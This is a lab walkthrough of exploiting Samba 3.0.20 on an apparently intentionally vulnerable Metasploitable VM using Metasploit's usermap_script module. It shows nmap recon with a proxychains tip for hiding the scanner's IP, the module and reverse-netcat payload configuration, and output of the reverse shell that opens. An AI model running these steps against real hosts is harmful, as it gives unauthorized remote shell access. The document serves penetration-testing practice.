Metasploit - Exploiting Samba using msfconsole

+ Recon the target machine, during recon I find this version and open port for samba running on target machine

# nmap -T5 -A -v 192.168.202.142
	++ Anonymizing your scan, especially to hide your IP, use with proxychains
		# proxychains nmap -T5 -A -v 192.168.202.142
	++ Aggresive scan
		+++ If you have no minimize firewall detection on your scan, use -T1 or -T2
	++ Enable OS detection, version detection, script scanning, and traceroute
	++ Verbose output
	
	Discovered open port 139/tcp on 192.168.202.142
	...
	...
	139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
	...
	...
	Host script results:
	|_clock-skew: mean: 1h19m09s, deviation: 2h18m34s, median: -51s
	| nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
	| Names:
	|   METASPLOITABLE<00>   Flags: <unique><active>
	|   METASPLOITABLE<03>   Flags: <unique><active>
	|   METASPLOITABLE<20>   Flags: <unique><active>
	|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
	|   WORKGROUP<00>        Flags: <group><active>
	|   WORKGROUP<1d>        Flags: <unique><active>
	|_  WORKGROUP<1e>        Flags: <group><active>
	| smb-os-discovery: 
	|   OS: Unix (Samba 3.0.20-Debian)
	|   NetBIOS computer name: 
	|   Workgroup: WORKGROUP\x00
	|_  System time: 2019-07-14T07:17:23-04:00
	|_smb2-time: Protocol negotiation failed (SMB2)

+ By using this information, I can gather more information on google for any available exploit I can use

+ I found a disclose exploit I can use and available in metasploit
	++ https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script


Exploitation phases

+ Start metasploit console
	# msfconsole
	
+ Search module name
	# search samba

	Matching Modules
	================

	#  Name                                Disclosure Date  Rank       Check  Description
	-  ----                                ---------------  ----       -----  -----------
	0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution

+ Using exploit module available
	# use exploit/multi/samba/usermap_script

+ Setting up payload for the exploit, not all exploit or vulnerabilities comes with backdoor, attacker has too configured suitable payload to gain access to target machine or you can configure the payload to your liking

+ To show payload
	# show payloads
	#   Name                                Disclosure Date  Rank    Check  Description
	-   ----                                ---------------  ----    -----  -----------
	21  cmd/unix/reverse_netcat                              normal  No     Unix Command Shell, Reverse TCP (via netcat)


+ Use payload
	# set payload payload cmd/unix/reverse_netcat

+ Configuring Module and Payload
	++ If target port is different with preconfigured in payload or module, you can set the port to match the port on target machine
	++ Port for payload can be configured to other port, but it cannot clash with other service using that port number
	
	# show options
	
	Module options (exploit/multi/samba/usermap_script):

	Name    Current Setting  Required  Description
	----    ---------------  --------  -----------
	RHOSTS                   yes       The target address range or CIDR identifier
	RPORT   139              yes       The target port (TCP)


	Payload options (cmd/unix/reverse_netcat):

	Name   Current Setting  Required  Description
	----   ---------------  --------  -----------
	LHOST                   yes       The listen address (an interface may be specified)
	LPORT  4444             yes       The listen port


	Exploit target:

	Id  Name
	--  ----
	0   Automatic

	# set RHOSTS 192.168.202.142
	# set LHOST 192.168.202.141
	# set LPORT 8080
	
+ Making sure that the configuration is correct

	Module options (exploit/multi/samba/usermap_script):

	Name    Current Setting  Required  Description
	----    ---------------  --------  -----------
	RHOSTS  192.168.202.142  yes       The target address range or CIDR identifier
	RPORT   139              yes       The target port (TCP)


	Payload options (cmd/unix/reverse_netcat):

	Name   Current Setting  Required  Description
	----   ---------------  --------  -----------
	LHOST  192.168.202.141  yes       The listen address (an interface may be specified)
	LPORT  8080             yes       The listen port


	Exploit target:

	Id  Name
	--  ----
	0   Automatic

+ Run the exploit
	# exploit 

	[*] Started reverse TCP handler on 192.168.202.141:8080 
	[*] Command shell session 1 opened (192.168.202.141:8080 -> 192.168.202.142:37693) at 2019-07-14 19:52:07 +0800
	
	uname -a    
	Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux

+ Now we have succesfully exploiting the target machine


